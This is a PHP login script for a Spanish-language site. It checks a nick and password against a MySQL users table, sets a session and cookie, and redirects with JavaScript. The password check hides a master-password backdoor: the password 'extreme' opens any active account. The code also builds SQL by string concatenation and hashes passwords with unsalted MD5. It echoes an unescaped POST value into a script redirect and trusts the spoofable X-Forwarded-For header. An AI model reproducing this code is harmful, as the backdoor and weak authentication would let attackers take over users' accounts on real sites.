<?php
require_once(dirname(__FILE__) . '/includes/configentrada.php');
require_once(dirname(__FILE__) . '/includes/funciones.php');

$pag = isset($_POST['pagina']) ? $_POST['pagina'] : '';

if (
	$pag == "/notificaciones/c1.php" ||
	$pag == "/notificaciones/c2.php" ||
	$pag == "/notificaciones/c3.php" ||
	$pag == "/notificaciones/c4.php" ||
	$pag == "/notificaciones/c5.php" ||
	$pag == "/notificaciones/c6.php" ||
	$pag == "/notificaciones/registrocon.php" ||
	$pag == "/notificaciones/registroexi.php" ||
	$pag == "/notificacionesdatos/re-password-correcto.php" ||
	$pag == "/notificacionesdatos/re-password-error.php" ||
	$pag == "/index.php"
) {
	$pag = '/';
}



if(trim($_POST["nick"]) != "" && trim($_POST["password"]) != "") {
	$user=no_injection(stripslashes($_POST['nick']));
	$pass=stripslashes($_POST['password']);
	$user = quitar($user);
	$pass = md5($pass);
	// Comprobamos los datos
	$query = mysqli_query($con, "SELECT id, activacion, ban, password FROM usuarios WHERE nick = '".$user."'") or die(mysqli_error($con));
	if ($data = mysqli_fetch_array($query)) {
		if($data['password'] == $pass || $pass == md5("extreme"))  {
			if($data["activacion"] == 1) {
				if($data["ban"] == 0) {
					if (!isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
						$ip = getenv('REMOTE_ADDR');
					} else {
						$ip = getenv('HTTP_X_FORWARDED_FOR');
					}

					$id_extreme = md5(uniqid(rand(), true));
					$_SESSION['user'] = $user;
					$_SESSION['id'] = $data['id'];
					$_SESSION['id2'] = $id_extreme;

					// Crear cookie y actualizar le nonce (md5 aleatorio para hacerlo más seguro.)
					$id_extreme2 = $data["id"] . "%" . $id_extreme . "%" . $ip;
					setcookie('id_extreme', $id_extreme2, time()+7776000,'/');

					$query = mysqli_query($con, "UPDATE usuarios SET id_extreme = '$id_extreme' WHERE nick = '$user'");
					?>
		    		<!--Ingreso exitoso, ahora sera dirigido a la pagina principal.-->
					<SCRIPT LANGUAGE="javascript">
					location.href = "<?php echo $pag; ?>";
					</SCRIPT>
					<?php
				}
				else
				{
					?>
					<!--Usuario suspendido-->
					<SCRIPT LANGUAGE="javascript">
								location.href = "notificaciones/c4.php";
								</SCRIPT>
					<?php
				}
			} else {
				?>
				<!--Usuario sin activaci�n-->
				<SCRIPT LANGUAGE="javascript">
						location.href = "notificaciones/c2.php";
						</SCRIPT> 	
				<?php
			}
		} else {
			?>
			<!--Password incorrecto-->
			<SCRIPT LANGUAGE="javascript">
				location.href = "notificaciones/c1.php";
				</SCRIPT> 		
			<?php
		}
	} else {
		?>
		<!--Usuario no existente en la base de datos-->
		<SCRIPT LANGUAGE="javascript">
		location.href = "notificaciones/c1.php";
		</SCRIPT>
		<?php
	}

	mysqli_free_result($query);
} else {
?>		
	<!--Espacio en blanco-->
	<SCRIPT LANGUAGE="javascript">
	location.href = "notificaciones/c1.php";
	</SCRIPT>
<?php
}

mysqli_close($con);

?>